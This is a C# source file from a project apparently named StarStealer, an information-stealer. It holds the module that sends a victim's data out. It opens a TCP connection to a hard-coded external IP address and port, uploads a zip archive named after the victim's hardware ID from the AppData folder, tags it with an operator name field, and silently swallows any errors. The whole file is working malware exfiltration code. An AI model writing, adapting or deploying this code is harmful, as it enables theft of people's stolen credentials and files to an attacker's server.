using StarStealer.Models;
using System;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace StarStealer.Utilities
{
    class Sender
    {
        static string AdminName = "";
        public static  void Send(ref User user)
        {
            try
            {
                int BufferSize = 1024;
                TcpClient client = new TcpClient();
                String ServerIP = "128.199.55.54";
                client.Connect(ServerIP, 8006);
                byte[] buffer = null;
                byte[] header = null;
                FileStream fs = new FileStream($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\{user.Hwid}.zip", FileMode.Open);
                int bufferCount = Convert.ToInt32(Math.Ceiling((double)fs.Length / (double)BufferSize));
                string headerStr = "Content-length:" + fs.Length.ToString() + "\r\nFilename:" + user.Hwid + ".zip" + $"\r\nAdminName:{AdminName}";
                header = new byte[BufferSize];
                Array.Copy(Encoding.ASCII.GetBytes(headerStr), header, Encoding.ASCII.GetBytes(headerStr).Length);
                client.Client.Send(header);
                for (int i = 0; i< bufferCount; i++)
                {
                    buffer = new byte[BufferSize];
                    int size = fs.Read(buffer, 0, BufferSize);
                    client.Client.Send(buffer, size, SocketFlags.Partial);
                }
                client.Close();
                fs.Close();
            }
            catch
            {

            }
        }    
    }
}
